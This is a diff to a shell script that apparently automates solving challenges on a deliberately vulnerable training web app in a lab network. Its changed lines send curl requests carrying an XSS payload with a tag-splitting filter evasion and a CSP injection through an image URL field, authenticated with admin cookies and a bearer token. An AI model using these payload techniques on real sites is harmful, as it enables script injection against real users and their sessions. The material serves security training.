@@ -5,7 +5,7 @@ script=$(readlink -f $0)
 scriptpath=`dirname $script`
 
 # Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
-target_ip="10.10.206.114"
+target_ip="10.10.87.170"
 attack_ip="10.9.5.12"
 result_folder="/work/results/"
 
@@ -36,8 +36,8 @@ curl -s -X GET "http://$target_ip/support/logs/access.log.$TODAY" -b "$result_fo
 
 # Bypass the Content Security Policy and perform an XSS attack with <script>alert(`xss`)</script> on a legacy page within the application. 
 echo "4.2 - CSP BYPASS"
-curl -s -X POST "http://$target_ip/profile" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -L -d "username=</p><<script>sscript>alert(%60xss%60)</script><p>"
-curl -s -X POST "http://$target_ip/profile" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -L -d "imageUrl=http://placekittens.com/200/300+script-src+'unsafe-inline'"
+curl -s -X POST "http://$target_ip/profile" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: Bearer ${ADMIN_TOKEN}" -d "username=</p><<script>sscript>alert(%60xss%60)</script><p>" -o /dev/null
+curl -s -X POST "http://$target_ip/profile/image/url" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: Bearer ${ADMIN_TOKEN}" -d "imageUrl=http://placekittens.com/200/300;%20script-src%20'unsafe-inline'" -o /dev/null
 node $scriptpath/../../tools/playwright.js "http://$target_ip/profile" $result_folder/4-admin-cookies.txt > $result_folder/4-profile.html 2>/dev/null
 
 # Order the Christmas special offer of 2014.
